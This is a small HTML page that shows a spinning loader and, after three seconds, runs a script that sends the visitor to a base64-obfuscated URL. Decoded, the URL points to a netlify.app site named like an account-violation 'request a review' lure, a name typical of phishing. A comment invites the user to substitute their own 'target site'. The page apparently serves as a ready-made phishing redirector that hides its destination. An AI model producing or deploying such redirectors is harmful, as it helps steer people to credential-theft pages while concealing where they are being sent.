<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loader Redirect</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #f4f4f4;
    }

    .loader {
      width: 60px;
      height: 60px;
      border: 6px solid #ddd;
      border-top: 6px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="loader"></div>

  <script>
    setTimeout(() => {
      window.location.href = atob("aHR0cHM6Ly9yZXF1ZXN0LWEtcmV2aWV3LXZpb2xhdGlvbi5uZXRsaWZ5LmFwcC8="); // change to your target site
    }, 3000); // 3 seconds
  </script>
</body>
</html>
